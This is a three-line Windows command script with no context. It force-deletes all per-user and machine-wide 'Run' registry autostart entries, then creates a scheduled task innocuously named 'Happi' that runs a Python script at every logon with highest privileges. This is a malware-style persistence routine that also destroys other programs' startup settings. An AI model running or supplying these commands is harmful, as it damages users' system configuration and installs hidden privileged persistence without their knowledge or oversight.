reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /f
schtasks /create /tn "Happi" /tr "python.exe '%cd%'/startup.py" /sc onlogon /rl highest /f